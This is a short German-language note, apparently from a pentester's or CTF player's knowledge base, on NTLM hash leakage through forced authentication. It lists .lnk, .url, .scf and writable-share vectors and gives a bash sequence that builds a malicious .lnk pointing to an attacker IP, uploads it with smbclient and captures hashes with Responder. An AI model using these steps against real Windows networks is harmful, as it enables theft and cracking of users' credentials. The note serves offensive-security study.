---
tags: [technique, windows, credential-access]
aliases: [Forced Authentication, LNK Hash Leak]
---
# NTLM Hash Leak (Forced Authentication)

> Windows gegen einen **UNC-Pfad zu dir** (`\\<attacker-ip>\share`) authentifizieren lassen → es schickt automatisch den [[NTLM|NTLMv2]]-Hash, den du abfängst und crackst.

## Prinzip
1. Datei/Ressource verweist auf `\\<attacker-ip>\...`
2. Opfer löst die Auflösung aus (Öffnen, **Vorschau**, teils nur Rechtsklick).
3. Windows authentifiziert sich automatisch → Hash geht an deinen Listener ([[Responder]]).
4. Hash offline cracken → [[Hash Cracking]].

## Vektoren
| Typ        | Auslöser                                             |
| ---------- | ---------------------------------------------------- |
| `.lnk`     | **Rechtsklick/Preview** (2025er Research) – kein CVE  |
| `.url`     | Datei mit `URL=file://\\attacker\...`                |
| `.scf`     | Icon lädt von UNC-Pfad                               |
| SMB-Share  | präparierte Datei auf beschreibbarem Share ablegen   |

> [!note] Mark of the Web
> MS blockt den `.lnk`-Vektor nur bei **aus dem Internet geladenen** Dateien (MotW). Dateien auf **internen Shares** tragen kein MotW → weiterhin verwundbar.

## `.lnk` unter Linux bauen
```bash
x86_64-w64-mingw32-gcc -o poc poc.c   # poc.c zeigt auf \\<tun0-ip>\share
wine poc.exe                          # erzeugt poc.lnk
smbclient //<ziel>/share -N -c 'put poc.lnk'
```
Dann [[Responder]] laufen lassen und auf die Auth warten.
